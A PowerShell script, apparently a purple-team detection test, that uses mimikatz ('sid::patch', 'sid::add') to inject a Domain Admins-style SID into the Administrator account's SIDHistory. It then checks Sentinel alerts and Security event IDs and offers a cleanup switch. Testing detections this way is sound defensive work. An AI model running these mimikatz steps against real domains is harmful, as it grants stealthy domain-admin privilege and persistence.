
param([switch]$Cleanup)

$MIMIKATZ = "C:\Tools\mimikatz\x64\mimikatz.exe"
$LOG_DIR  = "C:\SecurityLogs\AttackSim"
$DOMAIN   = "corp.local"
$TARGET   = "Administrator"
$FAKE_SID = "S-1-5-21-9876543210-1234567890-9876543210-512"
$LOG_FILE = "$LOG_DIR\sidhistory-attack-$(Get-Date -Format 'yyyyMMdd-HHmmss').log"

if (-not (Test-Path $LOG_DIR)) { New-Item -ItemType Directory -Path $LOG_DIR -Force | Out-Null }

function Log($msg) {
    $line = "[$(Get-Date -Format 'HH:mm:ss')] $msg"
    Write-Host $line
    Add-Content -Path $LOG_FILE -Value $line -Encoding UTF8
}

Write-Host ""
Write-Host "============================================================" -ForegroundColor Magenta
Write-Host "  SIDHistory ATTACK SIMULATION" -ForegroundColor Magenta
Write-Host "  Target: $TARGET @ $DOMAIN" -ForegroundColor Magenta
Write-Host "  $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Magenta
Write-Host "============================================================" -ForegroundColor Magenta
Write-Host ""

if ($Cleanup) {
    Log "[CLEANUP] Removing injected SIDHistory from $TARGET..."
    try {
        Set-ADUser $TARGET -Remove @{SIDHistory = $FAKE_SID}
        Log "  Removed: $FAKE_SID"
    } catch {
        Log "  Note: $_ (may already be clean)"
    }
    $after = (Get-ADUser $TARGET -Properties SIDHistory).SIDHistory
    Log "  Remaining SIDHistory entries: $($after.Count)"
    exit 0
}

# Step 1: Baseline
Log "[1/6] Baseline SIDHistory for $TARGET..."
$before = (Get-ADUser $TARGET -Properties SIDHistory).SIDHistory
Log "  Current entries: $($before.Count)"

# Step 2: Patch NTDS
Log "[2/6] mimikatz sid::patch (bypass same-domain restriction)..."
$mimi1 = (& $MIMIKATZ "privilege::debug" "token::elevate" "sid::patch" "exit") -join "`n"
Add-Content -Path $LOG_FILE -Value $mimi1 -Encoding UTF8
Log "  Patch command sent."

# Step 3: Inject SID
Log "[3/6] Injecting high-risk SID (RID 512 = Domain Admins from fake domain)..."
Log "  SID: $FAKE_SID"
$mimi2 = (& $MIMIKATZ "privilege::debug" "token::elevate" "sid::patch" "sid::add /sam:$TARGET /new:$FAKE_SID" "exit") -join "`n"
Add-Content -Path $LOG_FILE -Value $mimi2 -Encoding UTF8
Log "  Injection command sent."

# Step 4: Verify in AD
Log "[4/6] Verifying SIDHistory in Active Directory..."
Start-Sleep -Seconds 5
$after = (Get-ADUser $TARGET -Properties SIDHistory).SIDHistory
$found = $after | Where-Object { $_.Value -eq $FAKE_SID }
if ($found) {
    Write-Host "[CONFIRMED] $FAKE_SID found in SIDHistory of $TARGET" -ForegroundColor Green
    Log "  [CONFIRMED] SID injected. Total entries: $($after.Count)"
} else {
    Write-Host "[NOT FOUND] SID not in AD — checking DirectorySearcher..." -ForegroundColor Yellow
    Log "  SID not found via Get-ADUser. Raw mimikatz output in: $LOG_FILE"
    $mimi3 = (& $MIMIKATZ "privilege::debug" "token::elevate" "sid::patch" "exit") -join "`n"
    Log "  Patch check: $(if($mimi3 -match 'OK') {'OK'} else {'check log'})"
}

# Step 5: Run SIDHistory inventory scan
Log "[5/6] Running SIDHistory inventory scan..."
$scanOut = (powershell.exe -ExecutionPolicy Bypass -File "C:\SecurityScripts\SIDHistory-Inventory.ps1") 2>&1 | Out-String
Add-Content -Path $LOG_FILE -Value $scanOut -Encoding UTF8
$highCount = ([regex]::Matches($scanOut, "HIGH")).Count
Log "  Scan done. HIGH-risk matches in output: $highCount"

# Also run the upload script to push to Azure
Log "  Uploading to Azure Blob (triggers Sentinel rule)..."
$uploadOut = (powershell.exe -ExecutionPolicy Bypass -File "C:\SecurityScripts\SIDHistory-Inventory-Upload.ps1") 2>&1 | Out-String
Add-Content -Path $LOG_FILE -Value $uploadOut -Encoding UTF8
Log "  Upload done."

# Step 6: Check event log
Log "[6/6] Checking Windows Event Log for SIDHistory events..."
Start-Sleep -Seconds 3
$since = (Get-Date).AddMinutes(-5)
$e4765 = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4765; StartTime=$since} -ErrorAction SilentlyContinue
$e4766 = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4766; StartTime=$since} -ErrorAction SilentlyContinue
$e5136 = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=5136; StartTime=$since} -ErrorAction SilentlyContinue
Log "  EventID 4765 (SIDHistory add success): $($e4765.Count)"
Log "  EventID 4766 (SIDHistory add failure): $($e4766.Count)"
Log "  EventID 5136 (DS object modified)    : $($e5136.Count)"

Write-Host ""
Write-Host "============================================================" -ForegroundColor Magenta
Write-Host "  ATTACK COMPLETE" -ForegroundColor Magenta
Write-Host "============================================================" -ForegroundColor Magenta
Log "Expected Sentinel alerts within 5-10 min:"
Log "  - SIDHistory - High Risk SID Entry"
Log "  - SIDHistory - Privileged Logon Correlation (within 1h window)"
Log "Log: $LOG_FILE"
Write-Host ""
Write-Host "Run cleanup when done:" -ForegroundColor Yellow
Write-Host "  powershell -File Run-SIDHistoryAttack.ps1 -Cleanup" -ForegroundColor Yellow
